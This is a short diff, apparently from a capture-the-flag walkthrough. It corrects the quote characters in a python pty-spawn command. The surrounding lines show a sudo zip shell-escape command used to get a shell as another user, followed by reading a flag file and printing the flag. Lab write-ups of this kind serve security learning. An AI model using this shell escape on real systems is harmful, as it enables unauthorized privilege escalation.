@@ -181,7 +181,7 @@ hint: TF=$(mktemp -u)
 sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
 whoami
 id
-python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 cat flag.txt
 sudo -l
 silvio{657b4d058c03ab9988875bc937f9c2ef}
